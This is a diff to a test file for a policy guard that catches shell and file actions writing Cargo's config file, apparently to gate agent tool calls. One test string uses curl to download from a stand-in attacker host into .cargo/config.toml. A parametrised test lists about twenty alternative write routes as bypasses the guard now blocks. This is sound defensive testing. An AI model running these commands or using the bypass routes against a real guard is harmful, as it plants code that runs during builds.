@@ -67,9 +67,8 @@ def test_shell_writes_gated(cmd):
 
 
 def test_fetch_to_file_backstop():
-    hit, d = evaluate(_shell("curl -o .cargo/config.toml https://evil.example/c"), EMPTY), None
-    assert hit.rule in (RULE, "fetch-to-file-protect")
-    assert hit.action != Action.ALLOW
+    d = evaluate(_shell("curl -o .cargo/config.toml https://evil.example/c"), EMPTY)
+    assert d.rule == "fetch-to-file-protect" and d.action == Action.ASK
 
 
 @pytest.mark.parametrize("ev", [
@@ -107,3 +106,31 @@ def test_off_and_monitor():
                      Policy(cargo_config_exec={"mode": "off"}))[0]
     assert not _rule(_file("Write", ".cargo/config.toml"),
                      Policy(cargo_config_exec={"mode": "monitor"}))[0]
+
+
+@pytest.mark.parametrize("cmd", [
+    "echo x >.cargo/config.toml", "echo x>.cargo/config.toml", "(echo x)>.cargo/config",
+    "install -m644 p .cargo/config.toml", "rsync p .cargo/config.toml",
+    "git checkout other -- .cargo/config.toml", "git apply p.diff; echo .cargo/config.toml",
+    "patch .cargo/config.toml p", "echo x | sponge .cargo/config.toml",
+    "ln -s /tmp/p .cargo/config.toml", "touch .cargo/config.toml",
+    "New-Item .cargo/config.toml", "[IO.File]::WriteAllText('.cargo/config.toml','x')",
+    "python3 - <<'E'\nopen('.cargo/config.toml','w').write('x')\nE",
+    "echo x > $CARGO_HOME/config.toml", "echo x > ${CARGO_HOME}/config",
+    "unlink .cargo/config.toml",
+])
+def test_round2_bypasses_closed(cmd):
+    assert _rule(_shell(cmd))[0]
+
+
+@pytest.mark.parametrize("path", ["$CARGO_HOME/config.toml", "${CARGO_HOME}/config"])
+def test_cargo_home_var_file_write(path):
+    assert _rule(_file("Write", path))[0]
+
+
+def test_shell_deny_policy_and_env(monkeypatch):
+    cmd = "echo x > .cargo/config.toml"
+    assert _rule(_shell(cmd), DENY)[1].action == Action.DENY
+    assert not _rule(_shell(cmd), Policy(cargo_config_exec={"allow": [r"\.cargo"]}))[0]
+    monkeypatch.setenv("AEGIS_ALLOW_CARGO_CONFIG_EXEC", "1")
+    assert not _rule(_shell(cmd))[0]
